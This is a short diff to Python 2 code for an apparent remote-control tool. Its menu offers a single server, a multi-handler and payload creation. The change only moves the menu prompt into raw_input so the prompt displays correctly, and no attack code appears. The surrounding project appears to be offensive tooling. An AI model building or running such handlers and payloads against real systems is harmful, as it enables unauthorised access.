@@ -16,7 +16,6 @@ def show_graphic():
     print(h.GREEN_THIN+"3"+h.WHITE+") Create Payload")
     print(h.GREEN_THIN+"0"+h.WHITE+") Exit")
     print("")
-    print(h.NES)
     
 class mouse:
     def __init__(self):
@@ -188,7 +187,8 @@ class mouse:
                 if self.server.debug:
                     print "Debug On"
                 sys.stdout.write(self.banner_text)
-                option = raw_input(show_graphic())
+                show_graphic()
+                option = raw_input(h.NES)
                 choose = {
                     "1" : self.start_single_server,
                     "2" : self.start_multi_handler,
